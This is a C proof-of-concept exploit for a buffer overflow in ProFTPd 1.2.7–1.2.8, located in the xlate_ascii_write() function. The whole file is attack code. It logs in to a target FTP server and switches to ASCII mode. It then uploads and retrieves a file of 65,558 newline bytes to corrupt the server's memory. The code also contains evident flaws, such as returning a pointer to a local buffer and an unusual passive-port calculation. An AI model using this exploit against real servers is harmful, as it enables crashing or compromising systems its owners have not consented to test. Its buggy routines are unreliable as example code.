/*
*  -- ProFTPd [1.2.7-1.2.8] proof-of-concept --
*  
*  This code is quite ugly, don't have time cleaning it;
*   
*  description: iss gave a lil hint to me, so i found the vuln
*  in src/data.c file, xlate_ascii_write()  function
*  when the iss advisory came out.
*  
*  -netris at ok.kz
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int s1,s2;
struct sockaddr_in a1,a2;
char *senddata(int sock,char *data, int resp);
void data_connect(char *addr,char *pasv, int bool);
int data_port(char *pret, char *addr);

int main(int argc, char *argv[])
{
	char *ret;
	char buf[100];
	
	if(argc!=4){
		fprintf(stderr,"usage: %s login pass ip_addr\n",argv[0]);
		exit(0);
	}
	
	a1.sin_family = AF_INET;
	a1.sin_port = htons(21);
	a1.sin_addr.s_addr = inet_addr(argv[3]);
	
	s1 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	connect(s1,(struct sockaddr*)&a1,sizeof(a1));
	
	senddata(s1,0,1);
	sprintf(buf,"USER %s\n",argv[1]);
	senddata(s1,buf,2);
	sprintf(buf,"PASS %s\n",argv[2]);
	senddata(s1,buf,2);
	senddata(s1,"TYPE A\n",2);
	
	ret = senddata(s1,"PASV\n",2); /*STOR*/
	data_connect(argv[3],ret,0);
	ret = senddata(s1,"PASV\n",2); /*RETR*/
	data_connect(argv[3],ret,1);
	ret = senddata(s1,"PASV\n",2); /*RETR (needed sometimes)*/
	data_connect(argv[3],ret,1);

	close(s1);
	close(s2);
	return 0;
}

char *senddata(int sock,char *data, int resp) 
{
	char buf[66000];
	int i;
	if(resp>=2){
 		send(sock,data,strlen(data),0);
		if(strlen(data)<512)
			printf("%s\n",data);
 	}
	if(resp<=2){
  		i=recv(sock,buf,sizeof(buf),0);
		buf[i]=0;
		if(strlen(buf)<512)
			printf("%s",buf);
	} 
	return buf;
}

int data_port(char *pasv, char *addr)
{
	int i=0,j,p1,p2,h1=1;
	p1=p2=0;
	for(j=0;j<4;j++)
		for(i+=1;pasv[i]!=',';i++);
	for(i+=1;pasv[i]!=',';i++)
		p1=p1*10+pasv[i]-'0';
	for(i+=1;pasv[i]!=')';i++)
		p2=p2*10+pasv[i]-'0';
	h1 += inet_addr(addr) & 0x000000ff;
	j = p1*h1*2+p2;
	printf("Data port: %d\n",j);
	return j;
}

void data_connect(char *addr, char *pasv, int bool)
{
	int port,i;	
	static char buf[65559];
	close(s2);
	port = data_port(pasv,addr);
	a2.sin_port = htons(port);
	a2.sin_family = AF_INET;
	a2.sin_addr.s_addr = inet_addr(addr);
	s2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	connect(s2,(struct sockaddr*)&a2,sizeof(a2));
	if(!bool){
		senddata(s1,"STOR kf\n",2);
		for(i=0;i<65558;i++)buf[i]=0x0a;
		buf[i]=0;
		senddata(s2,buf,3);
		close(s2);
	}
	else{
		senddata(s1,"RETR kf\n",2);
		senddata(s2,"\n",2);
	}
	senddata(s1,"\n",2);
}
